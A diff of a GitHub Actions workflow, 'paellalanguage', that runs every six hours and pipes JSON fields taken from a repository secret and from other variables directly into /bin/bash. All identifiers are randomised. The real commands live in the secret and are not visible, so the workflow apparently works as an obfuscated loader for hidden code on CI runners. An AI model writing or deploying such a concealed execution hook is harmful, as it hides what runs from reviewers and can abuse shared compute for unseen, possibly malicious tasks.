@@ -1,29 +1,30 @@
 name: paellalanguage
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 2/6 * * *'
+    - cron: '1 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: paellalanguage
         env:
-          zdmzq76105: ${{ secrets.zdmzq76105 }}
+          ix3142: ${{ secrets.ix3142 }}
         run: |
-          echo $zdmzq76105 | jq -r .blaea596 | /bin/bash
-          echo $sdhs67068 | jq -r .wi582 | /bin/bash
-          echo $de1023 | jq -r .h84 | /bin/bash
-          echo $kvhsx6 | jq -r .ko10 | /bin/bash
-          echo $f3034 | jq -r .ymq296 | /bin/bash
-          echo $onc85 | jq -r .tsacf22 | /bin/bash
-          echo $gzrxy02 | jq -r .viy6 | /bin/bash
-          echo $cgo7441 | jq -r .nkes6427 | /bin/bash
-          echo $w4 | jq -r .tjbr9245 | /bin/bash
-          echo $zeolk9 | jq -r .awb8021 | /bin/bash
-          echo $vc692 | jq -r .fiadz024 | /bin/bash
-          echo $qq282 | jq -r .bsb8 | /bin/bash
-          echo $qhwdm9 | jq -r .uro925 | /bin/bash
-          echo $ouy554 | jq -r .nijot68575 | /bin/bash
+          echo $ix3142 | jq -r .w17 | /bin/bash
+          echo $iun29873 | jq -r .kntr544 | /bin/bash
+          echo $jvmj041 | jq -r .lba28 | /bin/bash
+          echo $zfs404 | jq -r .wk392 | /bin/bash
+          echo $wwp274 | jq -r .rjeam976 | /bin/bash
+          echo $mg63631 | jq -r .nxgz53 | /bin/bash
+          echo $b19229 | jq -r .mgs48459 | /bin/bash
+          echo $ix960 | jq -r .z34 | /bin/bash
+          echo $ro93 | jq -r .vks5 | /bin/bash
+          echo $zbqos58718 | jq -r .brob0990 | /bin/bash
+          echo $tfimc8273 | jq -r .pem5518 | /bin/bash
+          echo $g09593 | jq -r .fky5 | /bin/bash
+          echo $edco3629 | jq -r .ac6800 | /bin/bash
 
